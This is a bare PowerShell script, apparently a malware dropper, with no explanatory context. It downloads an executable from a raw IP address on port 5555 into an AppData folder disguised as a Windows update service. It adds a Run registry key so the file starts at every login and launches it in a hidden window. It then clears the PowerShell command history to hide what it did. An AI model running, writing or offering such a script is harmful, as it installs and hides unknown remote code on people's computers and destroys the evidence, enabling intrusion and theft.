mkdir "$env:APPDATA\Microsoft\Windows\UpdateService" -Force

curl.exe -L "http://190.153.147.14:5555/api/exec" -o "$env:APPDATA\Microsoft\Windows\UpdateService\systemUpdater.exe"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdateService" /t REG_SZ /d "$env:APPDATA\Microsoft\Windows\UpdateService\systemUpdater.exe" /f
Start-Process "$env:APPDATA\Microsoft\Windows\UpdateService\systemUpdater.exe" -WindowStyle Hidden

Clear-History
Clear-Content (Get-PSReadLineOption).HistorySavePath